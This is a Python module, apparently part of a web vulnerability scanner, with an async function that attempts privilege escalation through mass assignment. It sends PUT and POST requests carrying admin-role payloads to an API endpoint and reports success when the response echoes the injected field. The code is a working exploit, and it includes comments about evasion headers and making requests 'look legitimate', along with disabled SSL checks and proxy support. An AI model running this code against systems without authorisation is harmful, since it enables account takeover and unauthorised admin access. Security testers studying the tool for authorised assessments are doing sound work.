import aiohttp
import asyncio
import json

async def exploit_mass_assignment(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts to elevate privileges via Mass Assignment during profile updates.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # We assume 'url' is the API endpoint (e.g. POST /api/user/update)
    # And we assume it accepts JSON.
    
    payloads = [
        {"role": "admin"},
        {"role": "administrator"},
        {"is_admin": True},
        {"isAdmin": True},
        {"type": "admin"},
        {"group": "admin"},
        {"permissions": "all"}
    ]
    
    try:
        async with aiohttp.ClientSession(headers=final_headers) as session:
             # First, blind probe. send PATCH/PUT with these payloads.
             # We ideally need a valid session to update OUR own profile.
             # Since we don't have auth context management here fully, this is best effort.
             # We assume scanner might have passed cookies in a real scenario (Project Phantom integration needed).
             
             for payload in payloads:
                 try:
                     # Mix with generic data to look legitimate?
                     data = {"name": "TestUser"}
                     data.update(payload)
                     
                     if log_callback: log_callback(f"   ðŸ‘‘ Mass PrivEsc: Sending {json.dumps(payload)}...")
                     
                     # Try PUT and POST
                     for method in [session.put, session.post]:
                         async with method(url, json=data, timeout=5, ssl=False, proxy=proxy) as resp:
                             if resp.status == 200:
                                 text = await resp.text()
                                 # Check if the response confirms the change
                                 # e.g. returns the object with "role": "admin"
                                 
                                 # Normalize text to dict
                                 try:
                                     resp_json = json.loads(text)
                                     for k, v in payload.items():
                                         if k in resp_json:
                                             # If the return value matches our injection
                                             val = resp_json[k]
                                             if str(val).lower() == str(v).lower():
                                                  findings.append({
                                                        "type": "Privilege Escalation (Mass Assignment)",
                                                        "severity": "Critical",
                                                        "detail": f"Successfully injected and confirmed field '{k}': '{v}'.",
                                                        "evidence": f"Payload: {json.dumps(data)}\nResponse: {text[:200]}",
                                                        "remediation": "Whitelist allowed input fields (DTOs)."
                                                    })
                                                  return findings # Stop after success
                                 except: pass
                 except: pass
    except: pass
    
    return findings
